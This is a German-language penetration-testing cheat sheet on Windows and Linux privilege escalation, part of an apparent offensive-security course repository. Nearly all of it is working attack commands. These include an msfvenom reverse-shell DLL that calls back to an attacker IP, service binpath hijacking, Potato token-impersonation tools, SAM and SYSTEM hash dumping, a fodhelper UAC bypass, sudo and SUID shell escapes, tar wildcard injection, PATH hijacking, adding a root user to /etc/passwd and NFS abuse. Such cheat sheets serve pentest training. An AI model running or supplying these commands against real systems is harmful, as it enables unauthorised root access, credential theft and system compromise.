# ⬆️ Phase 3: Rechteausweitung (Privilege Escalation)

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Ziel:** Die Rechte eines Standardbenutzers auf Administrator/SYSTEM (Windows) oder root (Linux) erweitern.

> 📚 **Ausführliche Anleitungen:** [Windows PrivEsc](../../Windows-PrivEsc/README.md) | [Linux PrivEsc](../../Linux-PrivEsc/README.md)

---

## 🖥️ Rechteausweitung unter Windows

### Schnelle Ansatzpunkte – Zuerst prüfen
```cmd
# Aktuelle Rechte prüfen
whoami /priv
whoami /groups

# Auf gespeicherte Zugangsdaten prüfen
cmdkey /list

# Dateien für unbeaufsichtigte Installationen
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Dienste ausnutzen

#### Dienstpfad ohne Anführungszeichen
```cmd
# Pfade ohne Anführungszeichen finden
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Falls gefunden: C:\Program Files\Some Service\service.exe
# Schädliche EXE hier ablegen: C:\Program.exe oder C:\Program Files\Some.exe
```

#### Unsichere Dienstberechtigungen
```cmd
# Dienstberechtigungen mit accesschk prüfen
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Bei SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL-Hijacking (DLL-Ladevorgang übernehmen)
```powershell
# Dienste mit fehlenden DLLs finden (Process Monitor verwenden)
# Schädliche DLL im Dienstverzeichnis ablegen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Token-Impersonation (Identitätsübernahme)

#### SeImpersonatePrivilege (Potato-Angriffe)
```cmd
# Prüfen, ob SeImpersonatePrivilege vorhanden ist
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# SAM und SYSTEM sichern
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Hashes auf dem Angreiferrechner extrahieren
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Registry ausnutzen
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Beschreibbare Pfade geplanter Aufgaben
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Registry-Berechtigungen
accesschk.exe -kvw hklm\SOFTWARE
```

### UAC umgehen
```powershell
# Umgehung mit Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Automatisierte Werkzeuge
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Rechteausweitung unter Linux

### Schnelle Ansatzpunkte – Zuerst prüfen
```bash
# Sudo-Berechtigungen
sudo -l

# SUID-Programme
find / -perm -4000 -type f 2>/dev/null

# Beschreibbare /etc/passwd
ls -la /etc/passwd

# Kernel-Version für Exploits ermitteln
uname -a
```

### Sudo ausnutzen

#### Sudo ohne Passwort
```bash
# Wenn sudo -l Folgendes anzeigt: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Wenn sudo -l Folgendes anzeigt: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Wenn sudo -l Folgendes anzeigt: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Versionsabhängiger Sudo-Exploit (CVE-2021-3156)
```bash
# Sudo-Version prüfen
sudo --version

# Falls sudo < 1.9.5p2
# Exploit verwenden: https://github.com/blasty/CVE-2021-3156
```

### SUID-/SGID-Programme
```bash
# SUID-Programme finden
find / -perm -4000 -type f 2>/dev/null

# GTFOBins auf Möglichkeiten zur Ausnutzung prüfen
# https://gtfobins.github.io/

# Beispiel: SUID bei /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Beispiel: SUID bei /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Beispiel: SUID bei /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities (einzelne Linux-Sonderrechte)
```bash
# Programme mit Capabilities finden
getcap -r / 2>/dev/null

# Beispiel: cap_setuid bei python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cronjobs
```bash
# Cronjobs prüfen
cat /etc/crontab
ls -la /etc/cron.*

# Nach beschreibbaren Skripten suchen
# Wildcard-Injection bei tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH-Hijacking (Programmsuche beeinflussen)
```bash
# Wenn ein Cronjob/Skript ein Programm ohne vollständigen Pfad aufruft
# Schädliches Programm in einem beschreibbaren PATH-Verzeichnis erstellen

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Beschreibbare /etc/passwd
```bash
# Wenn /etc/passwd beschreibbar ist
# Passworthash erzeugen
openssl passwd -1 -salt evil password123

# Benutzer mit root-Rechten hinzufügen
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Zum neuen Benutzer mit root-Rechten wechseln
su evil
```

### Kernel-Exploits
```bash
# Kernel-Version prüfen
uname -r
cat /proc/version

# Nach Exploits suchen
searchsploit linux kernel 4.4 privilege escalation

# Bekannte Kernel-Exploits:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### NFS ausnutzen
```bash
# Auf no_root_squash prüfen
showmount -e 192.168.1.10
cat /etc/exports

# Bei no_root_squash:
# Freigabe einhängen und als root ein SUID-Programm erstellen
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# Auf dem Zielsystem:
/mnt/bash -p
```

### Automatisierte Werkzeuge
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Kurzreferenz

### Windows-Checkliste
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, etc.)
- [ ] Dienstpfade ohne Anführungszeichen
- [ ] Unsichere Dienstberechtigungen
- [ ] AlwaysInstallElevated
- [ ] Gespeicherte Zugangsdaten (cmdkey /list)
- [ ] Unattend-/Sysprep-Dateien
- [ ] Geplante Aufgaben
- [ ] WinPEAS/PowerUp ausführen
```

### Linux-Checkliste
```markdown
- [ ] sudo -l
- [ ] SUID-Programme (GTFOBins prüfen)
- [ ] Capabilities
- [ ] Cronjobs (beschreibbare Skripte, Wildcards)
- [ ] /etc/passwd beschreibbar
- [ ] Kernel-Version (Exploits)
- [ ] NFS no_root_squash
- [ ] LinPEAS ausführen
```

---

## 🔗 Weiterführende Cheatsheets

- [Windows-Rechteausweitung (vollständig)](../../Windows-PrivEsc/README.md)
- [Linux-Rechteausweitung (vollständig)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Vorherige Phase:** [← 02 - Enumeration](./02-Enumeration.de.md)

**Nächste Phase:** [04 - Laterale Bewegung (Lateral Movement) →](./04-Lateral-Movement.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Versions- und Beispielhinweise:** Versionsnummern allein beweisen keine Verwundbarkeit; Distributionen können Sicherheitskorrekturen zurückportieren. Für CVE-2021-3156 nennt der Entdecker die ungepatchten Reihen 1.8.2–1.8.31p2 und 1.9.0–1.9.5p1; die Kurzform `< 1.9.5p2` im Beispiel ist daher zu pauschal. [Qualys-Advisory](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)

> **Weitere Einordnung:** *SUID/SGID* sind Dateirechte zur Ausführung mit der Benutzer-/Gruppenidentität des Dateieigentümers. *Capabilities* sind einzeln vergebene Linux-Sonderrechte. UAC-Umgehung setzt passende Kontorechte und Konfiguration voraus und macht einen beliebigen Standardbenutzer nicht automatisch zum Administrator. Der Hash `xyz...` im `/etc/passwd`-Beispiel ist ein Platzhalter. Der `tar`-Abschnitt zeigt nur die Vorbereitung einer Wildcard-Injection, nicht den auslösenden privilegierten `tar`-Aufruf.
